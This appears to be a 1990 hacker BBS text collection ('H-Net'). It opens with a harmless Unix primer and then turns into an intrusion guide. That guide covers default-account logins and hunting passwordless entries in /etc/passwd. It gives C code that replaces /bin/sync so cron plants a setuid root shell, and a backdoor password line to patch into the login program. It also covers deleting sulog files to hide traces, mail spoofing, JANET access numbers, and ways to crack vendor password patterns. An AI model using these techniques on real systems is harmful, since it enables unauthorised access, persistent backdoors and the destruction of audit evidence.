UNIX is widely-touted as 'the operating sustem of the future', though in fact
it dates from 1969 (it was developed originally by Bell Laboratories, which
runs most of the telephone systems in the USA).  Since then it's been under
continuous development; so it's not so much an old operating system as a fairly
 
mature one, if you see what I mean. Hackernet BBS has many unix files for you.
 
Unix gets brownie points straight off because it was conceived by a user of
computers rather than a software specialist or some other sort of software
designer.  So it is relatively easy to use; which nearly all other software the
 
prime goal often seems to be to make money, or to sell more hardware and
software, or whatever.
 
In brief, UNIX is a general-purpose, multi-user operarting system with a clever
 
method of holding files.  It's a complex system, which means both that it is
rich in facilities and difficult to get to grip with - until now!.....
 
BEGINNER'S GUIDE TO THE WONDERFUL WORLD OF UNIX
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
The aim of this first textfile is to give an insight into the fundamentals of
UNIX.  Subsequent textfiles will delve into all areas of UNIX in greater depth.
 
 
WHAT IS UNIX?
~~~~~~~~~~~~~
 
The UNIX operating system can be divided into a number of distinct parts. First
 
there is the part of the system which performs all of the interface to the
hardware, scheduling disks, managing memory, handling terminal I/O and
generallu handling any requests to and from the devices on the system.  This
part of UNIX is called the UNIX Kernel.  It is in fact one large, compiled 'C'
program which is kept on the hard disk and loaded into memory when the system
is booted up.  The UNIX Kernel is always kept in memory because practically
everything that is done on UNIX uses the Kernel.  Buts on its own, it is of
little use.  There is no point in just having an interface to the hardware - an
 
itnerface to the user is also required.  This is provided by the UNIX shell.
 
The shell is another name for a TIP (Terminal Interface Program) or a JCL (Job
Control Language).  Its job is to read input from the terminal and execute the
right programs, depending on the input.  A program which is executing in UNIX
is called a process.  In fact, the shell is also a 'C' program which is
executing for each terminal which is logged on.  It reads input from the
terminal, interprets the input in various ways and starts the appropriate
processes.
 
As well as interpreting input and executing processes, the shell has its own
control-flow constructs and it can therefore be used as a programming language.
 
It also handles pipes and redirection of I/O which will be the subject of a
later textfile.
 
The way the UNIX shell works is much the same as other operating systems. It
displays a prompt, normally '$' the user types in the command to execute and
the shell reads the command, searches for the program which is the same name as
 
the command typed in and it then executes this file, if it found it.  When the
program finishes executing, the shell redisplays the prompt to the terminal.
 
OK, so we have a Kernel to handle the devices and a Shell to interpret input
form the users terminal.  The final and by far the largest part of UNIX is the
Programs.  There are many Programs in UNIX which form a part of the operating
system.  In UNIX jargon, these are called Utilities.
 
There are Utilities to look at directories, edit files, semd files to the line
printer, perform backups, look at files, delete files, the list is endless.
These Utilities are, to the user, commands which are typed in at the terminal
prompt.  For example; 'ls' is the UNIX Utility to list the directory; 'cd' is
the Utility to change directory.  In some systems the Utilities form a part of
the terminal interface program which interacts with the user.  In UNIX, very
few Utilities are a part of the Shell, the majority of them are external to the
 
Shell and are called up whenever they are needed.
 
This is because there are 200-300 UNIX Utilities, and including all of them in
the shell would obviously increase the size of the Shell to an unreasonable
level.  It is much neater to keep them on the disk to be called as and when
they are needed.
 
On a typical UNIX system, as well as the operating system, there would also be
some other packages, word processing, spreadsheets, etc.  These are necessary
because UNIX does not include any of these - UNIX is only an  Operating System.
 
 
 
THE UNIX FILE STRUCTURE
~~~~~~~~~~~~~~~~~~~~~~~
 
The above description of UNIX is very conceptual.  You never actually se the
UNIX Kernel, excpept perhaps as a process on the system.  The Shell too, is
just always there when you login.  The file structure, however, has to be
manipulated and managed by the user all the time.  The UNIX file structure is
hierarchical.
 
Within the file structure there are files and there are directories - as shown
in the diagram below :-
 
                              /(root)
 
                                 |
        _________________________________________________
        |       |       |       |       |       |       |
        bin     dev     etc     lib     tmp     unix    usr
        |       |       |       |       |       |       |
      -----   -----   -----   -----   -----   -----   -----
      | | |   | | |   | | |   | | |   | | |   | | |   | | |
                                                     --- ---
                                                     ||| |||
 
Files contain data and directories contain either files and/or directories. At
the top of the hierarchy is the ROOT directory, this is sometimes referred to
as /(slash).  Below the root directory are the system files and directories.
 
When a user logs into the system, he logs into his HOME directory. Every user
of the system has a HOME directory where he can create and delete files and
directories.  This part of the system belongs to him. User directories are
usually kept in the directory 'usr' which is directly below the root directory.
 
For example, say the user Fred has the directory structure as shown below :-
 
 
 
 
 
 
 
 
 
                       /(root)
                          |
                         usr
                          |
                        fred
                          |
          ----------------------------------
          |       |       |        |       |
        cprogs  memos   wpfles  sprdsht pending
          |       |       |        |       |
        -----   -----   -----    -----   -----
        | | |   | | |   | | |    | | |   | | |
                               1990
 
When Fred logs on he will automatically go to the directory 'fred'.  If
however, Fred wants to examine his spreadsheets, he may want to go to the
spreadsheet directory.  He would do this by using the 'cd' command to change
directory, i.e:
 
$cd sprdsht
 
This command would make his CURRENT DIRECTORY the spreadsheets directory but
his HOME directory wouls remain the same.  If he wanted to move to his 1988
directory from his home directory the command would be :
 
$cd sprdsht/1990
 
The '/' between the two directory names is the delimiter.
 
The construct 'sprdsht/1990' is called a Pathname.  Infact this particular type
 
of Pathname is called a Relative Pathname because it is relative to the
directory the user is currently in.  That is, the path 'sprdsht/1990' would be
meaningless if the users current directory was 'wpfls'.
 
Another type of pathname is an Absolute Pathname.  This, as the name suggests,
is a path from the root directory and is therefore independent of the user's
current directory.  Absolute pathnames are represented by using a '/' as the
first character of a path.  For example, the Absolute Pathname of the directory
 
mentioned would be '/usr/fred/sprdsht/1990'.
 
The command :-
 
$cd /usr/fred/sprdsht/1990
 
would take Fred right to the directory regardless of his current directory. the
 
command to find the Absolute Directory is :-
 
$pwd
 
The stands for 'print working directory'.  As mentioned above, the command to
look at the contents of a directory is 'ls'.  By simply typing :-
 
$ls
 
a list of filenames is output.  This looks like :-
 
cprogs
memos
wpfls
sprdsht
pending
 
This is fine if just the names is required but, it is impossible to tell from
this information which are files and which are directories.  As with a lot of
UNIX commands, the 'ls' command performs a mimimum function.
 
UNIX commands, generally speaking, have a number of options which can be used
with them, depending on exactly what the user wants.  For example the 'ls'
command just lists directories, if you want extra information, you have to ask
for it. UNIX must have either been written by a mimimalist or someone who
didn't like typing!!!  It does no more and no less than it is asked to, this is
 
something that users find quite difficult to understand.
 
The 'ls' command is the perfect example of this.  In most other systems it
would be called 'dir' or 'list'.  The most commonly used option with 'ls' is
'ls -l'.  In this case the 'l' stands for 'long'.  The command therefore
produces a long listing of the current directory.  The output looks soemthing
like that shown below :-
 
drwxr_xr_x 4 Fred  96 Jun  1 10:00 cprogs
drwxr_xr_x 4 Fred 195 Jul 25 09:34 memos
drwxr-xr_x 2 Fred 167 Aug 14 17:29 wpfls
drwxr_xr_x 2 Fred  84 May  7 07:56 sprdsht
drwxr_xr_x 2 Fred 952 Jun 16 13:51 pending
 
This will tell you whether the entry is a file or a directory. The permissions
(r is for read, w is for write, x is for execute), the number of links to the
file, the owner, the size (in bytes), the date it was last modified, and the
name of the entry.  Options for the commands are sometimes (not always)
preceeded with a minus sign and they usually consist of a letter which usually
stands for something.  The reason for this vagueness in the format of UNIX is
that UNIX has evolved through time and commands have been written by a variety
of people from a variety of places so there are no hard and fast rules - this
is another thing that newcomers to UNIX find frustrating.  It would be true to
say that for each one of the 'rules' mentioned above, there are exceptions.
There are also special commands for adding and removing directories from the
directory structure.  They are 'rmdir' for removing directories and 'mkdir' for
 
making directories.  They both expect a Pathname as a parameter which is the
name of the directory to be created or removed. For example, to create the
directory 'letters' below the directory 'wpfls' from Fred's HOME directory :-
 
$mkdir wpfls/letters
 
To remove this directory :-
 
$rmdir wpfls/letters
 
The command 'rmdir' will only remove empty directories, that is directories
which do not contain files or sub-directories.
 
Every directory in UNIX has two hidden entries, these are '.'(dot) and '..'
(dot-dot).  These are created when the directory is created.  '.' references
the current directory and '..' references the directory above the current
directory (called the Parent directory).  These two directories are in fact the
 
key to the way the whole file system is put together.  They can be seen by
using the '-a' option in the 'ls' command (i.e. 'ls -al') and they can also be
used in relative pathnames.  For example :-
 
$cd ../wpfls
 
from the directory 'sprdsht' in Fred's HOME directory is a perfectly acceptable
 
command.
 
With these commands many generations of UNIX users have had their first
foot-hold on UNIX.  If you have any UNIX problems or comments to make then
please leave me (MINOTAUR) a message on the Hackernet BBS.

Some of these id's might not even need a password - in that case you will go
striaght through to the '$' prompt when you have entered the ID!!
 
Some of you might be thinking that the above accounts would be the most likely
ones for any hackers to try and therefore the system manager of a UNIX system
would put a password on such accounts or at least change passwords to something
 
a little less obvious - well I would think that too - but it is suprising what
percentage of systems you can get into by trying out the above accounts.  I
don't know why the System Managers havent done anything about these accounts,
it is probably the old British attitude of 'it will never happen to our system'
 
- it can and probably will!  And dont think that it is only the small companies
 
that dont do very much about the security of there UNIX systems - I logged onto
 
a BT Unix computer (on a freephone/toll-free number I might add) with no id's
or passwords so I just started using some of the ones listed above - none of
the ones that I used worked - I was just about to give up when I thought that I
 
would try one last ID and Password before disconnecting and throwing the number
 
away. I didnt think for one moment that the ID that I was going to try would
work, after all it was one of British Telecoms UNIX machines - and of course
they would be really strict about security and things like that, but I will go
ahead and try it anyway... :-
 
login:sysman
password:sysman
 
$
 
I nearly fell off my chair when I got through on this account and to the '$'
UNIX prompt, how could British Telecoms computer security be so lax? Who cares,
 
 I was in! - and there was no password on the SU command!!! There is a list of
default passwords in this issue and continuous updates on Hackernet BBS.
 
 
If none of these accounts let you in then try obvious things like first names
(paul,john,steve,etc.), try using the id 'who' which on some systems will at
the 'login:' prompt tell you who else is on (useful clues for hackers!) or see
 if there are any clues on the logon screen eg "Welcome to British Telecoms
RACE computer" you would try things like race,race or btr/engineer, est. ok?
 
When you have logged onto a UNIX system, you should always do the following:
 
$ who -u
$ ps -ef
$ ps -u root
 
This prints out who is on, who is active, what is going on and what they are
 doing at the moment, everything in the background, and so on.
 
If you are calling the UNIX system for the first time you should enter the
following :-
 
$ grep :: /etc/passwd
 
This command will output to your screen parts of the 'passwd' userlist.  The
ones that we are interested in are the ones like this :-
 
paul::3323:2343:race user:/usr/paul
 
i.e. the ones with '::' after the username (paul in this case).  What this
means is that the user paul does not need a password to log on - funnily enough
 
 it is usually such accounts that have the highest level of access!
 
Also do this:
 
$ find / -name "*log*" -print
 
This lists out all the files with the name 'log' in it. If you do find a
process that is logging what you do, or an odd log file, change it as soon as
 you can. If you think someone may be looking at you and you don't want to
leave (Useful for school/college or university computers) then go into
something that allows shell breaks (VI for example), or use redirection to your
 
 advantage:
 
$ cat < /etc/passwd
 
That puts 'cat' on the ps, not 'cat /etc/passwd'. If you're running a setuid
 process, and don't want it to show up on a ps (Not a very nice thing to have
happen), then:
 
$ super_shell
# exec sh
(Runs the setuid shell (super_shell) and puts something 'over' it. You may also
 
want to run 'sh' again if you are nervous, because if you break out of an
exec'ed process, you die. Neat, huh?
 
Improving your id:
 
Firstly, you should issue the command
 
$id
 
The system will then tell you your uid and euid. This is useful for checking on
 
setuid programs to see if you have root euid privs.
 
Also, do this:
$ find / -perm -4000 -exec /bin/ls -lad {} ";"
 
Yes, this finds and does an extended list of all the files that have the setuid
 
bit on them, like /bin/login, /bin/passwd, and so on.
 
If any of them look nonstandard, play with them, you never can tell what a ^|
will do to them sometimes.  Also, if any are writeable and executable, copy sh
over them, and you'll have a setuid root shell. Just be sure to copy whatever
was there back, or else your stay might not last very much longer.
 
What, you have the 'bin' passwd? Well, game over. You have control of the
system. Everything in the bin directory is owned by bin (with the exception of
 
a few things), so you can modify them at will. Since cron executes a few
programs as root every once in a while, such as /bin/sync, try this:-
 
       main()
          {
          if (getuid()==0 || getuid()==0)
          {
          system("cp /bin/sh /tmp/sroot");
          system("chmod 4777 /tmp/sroot");
          }
          sync();
          }
 
..continued from previous page...
 
$ cc file.c
$ cp /bin/sync /tmp/sync.old
$ mv a.out /bin/sync
$ rm file.c
 
Now, as soon as cron runs /bin/sync, you'll have a setuid shell in /tmp/sroot.
Feel free to hide it. The 'at' & 'cron' commands l ook at the 'at' dir.
Usually /usr/spool/cron/atjobs. If you can  run 'at' (check by typing 'at'),
and 'lasttimedone' is writable, then submit a blank 'at' job, edit
'lastimedone' to do what you want it to do, and move lasttimedone over your
entry (like 88.00.00.00). Then the commands you put in lasttimedone will be
ran as that file's owner. Cron: in /usr/spool/cron/cronjobs, there are a list
of  people running cron jobs.  Cat rot's, and see if he runs any of the
programs owned by you (Without doing a su xxx -c "xxx"). For that matter, check
 
all the crons. If you can take one system login, you should be able to get
the rest, in time.
 
The disk files.
 
These are rather odd. If you have read permission on the disks in the '/dev'
directory then you can read any file on the system.
 
All you have to do is find it in there somewhere. If the disk is writeable,
if you use /etc/fsbd, you can modify any file on the system into whatever
you want, such as  by changing the permissions on '/bin/sh' to 4555. Since this
 
is pretty difficult to understand I won't bother with it any more.
 
Trivial su.
 
You know with su you can log into anyone elses account if you know their
passwords or if you're root. There are still a number of system 5's that have
uid 0, null passwd, rsh accounts on them. Just be sure to remove your entry in
the '/usr/adm/' directory - the log file is called 'sulog' and can be removed
 with the following command if you havent mastered the UNIX editor 'VI' yet :-
 
$ rm /usr/adm/sulog
 
or sometimes:-
 
$ rm /usr/admin/sulog
 
 
 
but one command that I always use on any new system conquest is :-
 
$ find / -name "sulog" -print
 
This will find all the files called 'sulog' - as some system managers have been
 
known to have two sulogs running at the same time, if you delete or edit the
one in the usual directory and then they would have a backup copy in another
directory as well.
 
Trojan horses?  On unix?
 
Yes, but because of the shell variable PATH, we are generally out of luck,
because it usually searches the '/bin' and '/usr/bin' directories first.
 
However, if the first field is a colon, files in the present  directory are
searched first. Which means if you put a modfied version of 'ls' there..... If
this isn't the case, you will have to try something more blatant, like putting
it in a game. If you have a system login, you may be able to get something
done like that. See cron.
 
Taking over
 
Once you have root privs, you should read all the mail in the '/usr/mail'
directory just to be sure that nothing interesting is in there, or anyone is
passing another systems passwd about even! You may want to add another entry to
 
the passwd file, but that's relatively dangerous to the life of your machine.
Be sure not to have anything out of the ordinary as the entry (i.e., No uid 0).
 
 
Get a copy of the login program (if at all possible) of that same version of
unix, and modify it a bit. On system 5, here's a modification pretty common in
the routine to check correct passwds, on the line before the actual pw check
put a
 
if (!(strcmp(pswd,"h-net"))) return(1);
 
to check for your 'backdoor' password "h-net", enabling you to log on as any
valid user that isn't uid 0 (On system 5).
 
Other UNIX tricks
 
Have you ever been on a system that you couldn't get 'root' status or read the
Systems/L.sys file?  Well, this is a cheap way to overcome it:-
 
$ uuname
 
will list all machines reachable by your unix, then, assuming that they aren't
direct, and that the modem is available:-
 
$ cu -d host.you.want
 
[or]
 
$ uucico -x99 -r1 -shost.you.want
 
Both will do about the same for us.  This will fill your screen with lots of
trivial information, but will eventually get to the stage of printing the
telephone number to the other system.
 
'-d' enables the cu diagnostics, '-x99' enables the uucico highest debug, and
'-R1' says 'uucp master'. A year or two ago, almost every system had their uucp
 
password set to the same thing as their nuucp passwd (Thanks to the Systems
file), so it was a breeze getting in. Even nowadays, some places do it.. you
never can tell.
 
 
 
Uucp
 
Uucico and uux are limited by the Permissions file, and in most cases, that
means means you can't do anything except get & take from the uucppublic
directories. Then again, if the permission/L.cmd is blank, you should be able
to take what files you want.
 
Sending mail
 
Sometimes, the mail program checks only the shell variable LOGNAME, so change
it, export it, and you may be able to send mail as anyone. Mainly early system
five's will let you do it thus :-
 
$ LOGNAME="root";export LOGNAME
 
Printing out all the files on the system
 
Useful if you're interested in the filenames:-
 
$ find / -print >file_list&
 
And then do a 'grep text file_list' to find any files with 'text' in their
names. Like grep [.]c file_list, grep host file_list....
 
Printing out all restricted files
 
Useful when you have root privileges. As a normal user, do :-
 
$ find / -print >/dev/null&
 
This prints out all non-accessable directories, so become root and see what
they want to hide from you!
 
UNIX Humour
 
On a system 5, do this :-
 
$ cat "food in cans"
 
or :-
 
$ banner "H-Net Lives!"
 
Hehehe......
 
Password hacking -Salt
 
In a standard /etc/passwd file, passwords are 13 characters long. This is a 11
char encrypted passwd and a 2 char encryption modifier (salt), which is used to
 
change the DES (data encryption standard) algorithm in one of 4096 ways. Which
means that there is no decent way to go and reverse hack it. Yet. On normal
system 5 UNIX systems passwords are supposed to be 6-8 characters long and have
 
both numeric and alphabetic characters in them. Which makes a dictionary hacker
 
pretty worthless. However if a user keeps insisting that his password is going
to be 'h-net' usually the system will comply (Depending on version). I have yet
to try it, but having the hacker try the normal entry, and then the entry
terminated by [0-9] is said to have remarkable results, if you don't mind the
10-fold increase in time.

JANET (the Joint Academic NETwork) is a favourite hacking tool for newcomers to
 
hacking - mainly because it and the computers attached to it offer you so much
help and information which can be used to do nice things with their micros!
 
Hey ho and here we go!
 
The first thing that you need to do is to find a telephone access number for
the JANET pad nearest to you.  To help you do this please refer to file #6, in
this issue of H-Net which is Hackernet BBS's latest list of such numbers and in
 
some cases gives the baud rates which have been tested out on these pads.
 
When you have found the telephone number that you need then set your comms
terminal to seven bits, even parity with one stop bit (7e1).  Then dial the
telephone number (a baudrate of 2400 is sometimes catered for - but is
unreliable on some pads).  When you get the CONNECT message press your <RETURN>
 
key a couple of times, if nothing happens then wait about 4 seconds then press
the <RETURN> key two or three times again.  You should now get a 'welcome'
message (on some PADS you might now get the prompt 'Which Service?' type 'PAD'
<RETURN>) the ypu will get a system prompt (e.g. 'PAD>'). If you do not get
such a prompt then drop the line and reconfigure your comms s/w (you might have
 
to do this a few times until you work out the proper settings as all pads do
not work on a uniform setting - unfortunately! - but it's all good hacking
experience anyway - trying to work out the proper settings for the target
system.
 
When you have the 'PAD>' or a similar prompt then type the following command:-
 
PAD> logon f,r
 
the pad isn't really all that fussy about what you use after the 'logon'
command, 'f,r' is just an example - in practise you could use anything, most
people use 'x,x' for some reasonh...please note that on some pads that you
might have to type 'login' instead of 'logon'.
 
What does this command do?  Well it tells the JANET Pad that when you have
called through to one of the computers connected to it's network - done your
business then exited from that computer that you want to return to the 'PAD>'
prompt so that you can 'CALL' other computers on the network.  If you do not
enter this command your line will be dropped when you have exited from the
first computer on the network that you have called - and that would mean having
 
to redial the pad again....yawn!
 
The next command to get to grips with is the 'CALL' command.  This along with a
 
NETWORK ADDRESS allows you to connect to other computers on the JANET network.
In file #7 in this issue of H-Net you will find a list of some of the computers
 
that you can connect to on the JANET network along with their NETWORK address
and/or their NETWORK mnemonic.
 
The way to use the 'CALL' command is as follows :- firstly, find the NETWORK
ADDRESS of the computer that you wish to connect to (in this example the
Unaxcess chatboard at Bradford University which is 0000121100 ), then type the
following at the 'PAD>' prompt :-
 
PAD> call j.0000121100
 
 
The 'j.' just tells the pad to expect a JANET address.  Please note that some
PAD managers have gotten wise to hackers using their PADs to gain access to
systems on the JANET network, in these cases they might have changed the format
 
of the 'CALL' command around a little bit - usually by making it so that the
'.' after the 'j' in the above example is no longer required - on such systems
the 'CALL' command should be :-
 
PAD> call j0000121100
 
On some PADs there is on online help facility - to make use of this just type:-
 
 
PAD> help
 
you should get a response similar to this :-
 
Help knows about :-
 
ADDRESS TARIFFS STATUS
 
The address helpfile is usually quite useful - to get this type :-
 
PAD> help address
 
then a nice list of network mnemonics available from that PAD might start
scrolling down your screen.  Mnemonics can be used instead of the NETWORK
ADDRESSES previously mentioned.  For instance if we wanted to call the
Lancaster Universities' PD software computer system use the following call
command :-
 
PAD> call lancs.pdsoft
 
It is just a nice way to be able to access the systems on the network as they
cannot expect the average student or lecturer to remember the 10 or 14 digit
NETWORK ADDRESSES which prevail on the JANET system!
 
When you have entered your 'CALL' command you should get a response such as
'connecting..' if you just get garbage then you might need to change the
configuration of your terminal.  For instance if you call the pad using 7e1
then when you call an address and just get garbage then quickly switch to 8n1
and press return once - you should then get some sense out of the computer that
 
you have requested access to (usually a 'login:' or similar prompt). If this
does not work then keep on changing your settings until you do get in.
 
 
From here on in it will be just like calling the target computer direct, except
 
that when you exit from the computer you will be returned to the 'PAD>' prompt
again (if you remembered to enter your 'logon' command!), again - if you just
get garbage after terminating your session on a computer on the JANET network
then you will need to reset the configuration of your comms s/w / terminal to
what it originally was when you first called the PAD.
 
Well, that just about sums it up I guess - this should be all you need to know
about using the JANET system and pads - the little quirks it has and so on. The
 
best thing about JANET in my eyes is that (usually for the price of a local
call) you can get into computers all over the world, belonging to mainly
educational establishments but also defence and other organisations!  The main
type of computers that you will find on JANET are VAX, UNIX and PRIME with a
splattering of other systems here and there.
 
I hope that this file has been of help to you - if you have any new information
 
about JANET in general or some of the systems available through it then please
e-mail me 'WEAZLE' on the Hackernet BBS.

JANET PAD listing - revision 1.2 - 1st March 1990
 
To start you off, two excellent public-access systems exist on JANET that are
CRAMMED with info and useful clues for would-be hackers!
 
These are:
 
JANET News Machine: 000050005002 (login as 'NEWS' - no password needed)
 
NISS Bulletin Board:000062200000
 
These two systems will give you plenty of starting points for possible hacks
(net addresses etc). But make sure that you're on a local call if possible
-before I found these PAD numbers, I spent 3 hours on a long-distance call to
the Janet News Machine!!! Hope this info is of use and interest - leave a msg
for 'Boris' on Hackernet BBS if you have questions/comments/suggestions/good
passwords!! One more thing - try calling 000002010001 - this is a PD software
archive run by Lancaster Uni. - they carry s/w for PC, ST, Amiga, BBC and (I
think) other machines as well. Eventually I'll put up a file on here going
intomore detail...(by the way, you'll need to login with username 'pdsoft' and
password 'pdsoft' - both in lower case) Bye for now, and have great fun - I
did! Cheers, Boz

                 UPDATES WITH THIS REVISION (1.3):
 
Added Leeds Uni's PAD (0532-461514).
Changed the line format slightly to squeeze in more comments.
Changed the format of the introductory notes to make them more readable (!)
Changed all London 01 codes to the new 071/081 format.
 
REVISION 1.2 (1 Mar '90)
 
Another name change - to JPADxx.TXT.
Hopefully this is easier to type - and leaves me a bit of room for extending
the filename if necessary!
ULCC's V23 node (071-831-6181) is actually 8-N-1 and not 7-E-1 as listed in
previous revisions.
The PAD's which I have actually tested and found to work OK are now markedwith
asterisks (*).
 
REVISION 1.1 (18th Feb '90)
 
Lancaster Uni's PAD actually uses 8 bits, no parity, one stop bit instead of
7-E-1! Apologies for the error...No more mistakes detected so far...! Cheers,
Boz.

                   THE SO-CALLED "UNCRACKABLE" PASSWORD
                  --------------------------------------
 
Many people consider the type of password - the so-  called random combination
of alpha and numeric characters  - to be "uncrackable" because so many billions
 
of  combinations seem possible. A six-character password of  this type using
only letters and numerals, could have  2,238,976,116 variations. This type of
password is most  frequently used by large data-base vendors. It is assigned
 to the user by the vendor, and is often used with systems  requiring only one
access level (that is, no second  security number) because the password is
believed to be so  invulnerable to cracking.
 
In reality, however, this password format is vulnerable  to solution by both
doors and algorithms. In the first case, not all passwords require the presence
 
of numbers. Passwords may be alphabetic characters only. In some cases pass-
words such as "GUEST" or "IBMCE" may provide a backdoor into the system.
 
Solution by algorithmcan also be simple because most systems do not use a truly
 
random method for generating passwords.  We know, for example, that MILNET
passwords exclude certain letters and numbers. There are doubtlessly other
rules involved  in their construction that we could discover. A study of pass-
words from a given system - we'll use Dow Jones  as an example here - can
reveal the patterns that are used to create such "uncrackable" passwords.
 
Dow Jones passwords are generally 10 characters long. If character assignment
were truly random, we would expect that most of the characters would be alpha-
betic because there are 26 alpha characters compared to only 10 numeric char-
acters. A random system would generate 2.6 alphas for each numeric character.
In fact, however, Dow Jones passwords appear to have only 4 or 5 alphabetic and
 
have 5 or 6 numeric characters. This is our first clue that the password sel-
ection proccess is not random. Here is a sample of the typical Dow Jones
passwords:
 
92J62P4BUF
35K4UPK931
59LTAN7521
 
Patterns are readily discernable:
 
1) The first two characters are numbers
2) The third character is a letter of the alphabet
3) Each password has at least two numbers that are duplicates.
4) No password has three numbers that are the same
5) Each password has one three-letter combination that includes a vowel
   (eg. BUF,UPK,TAN)
6) This alpha-triplet can begin at any character from the fourth to the eighth
   position.
7) No password has more than one vowel.
8) Passwords may have either 4 or 5 alphabetic characters.
9) While a password may have two alpha characters that are the same,these
   letters do not follow one another,
10) Of the 16 numbers used in the passwords above, none is a zero.
 
Examination of a large number of passwords would doubtlessly reveal other
"rules" that were used in Dow Jones password selection. Each newly-discovered
"rule" would limit the actual number of available passwords and make the system
 
that much more subject to cracking by computer.
 
TAKING THE "RANDOM" OUT OF RANDOM
 
One of the most notable factors in so-called tables of computerized "random"
numbers is that there are two basic ways of creating them. The first method is
to create a table that will provide what can statistically be said to be a
random list - that is no number or letter would theoretically occur more
frequently than any other number or letter. Most systems, however, simply rely
on an electronic component that creates alledgedly "random" numbers. These
hardware random number generators are usually biased in their number selections
 
 
One simple test of a random number generator is called the  "coin toss test." A
 
program is written to simulate the results of a thousand or so coin tosses.
Were the random number generator truly random, heads would appear about as
frequently as tails. In an actual test, however, heads appeared 421 times, and
tails appeared 579 times - a significant bias. A test such as this could be
performed over the entire alphanumeric character list and the component's bias
chartered.  Once this information was known, the cracking computer could be
programmed to insert this selection bias into it's own attempts to generate
passwords. This is yet another step that evens the odds between the hacker and
the so-called "uncrackable" password. This testing scheme, requiring either a
component or a computer like the target computer, would be a lengthy process,
but some people might regard the product as worth the time involved in
preparing such an analysis. A strategy of cracking Dow Jones system, given the
rules listed above, would be to create a program with an algorithm that
provided  combinations of passwords meeting the criteria above. As each
creation was tested, a pattern might be found in the successful creations that
would make the algorithm even more selective. One would expect, for example,
that simular to the MILNET and ARPANET passwords, certain confusing characters
would be eliminated from passwords. The number, "0" is often eliminated, for
example, because it is easily confused with the letter "O".
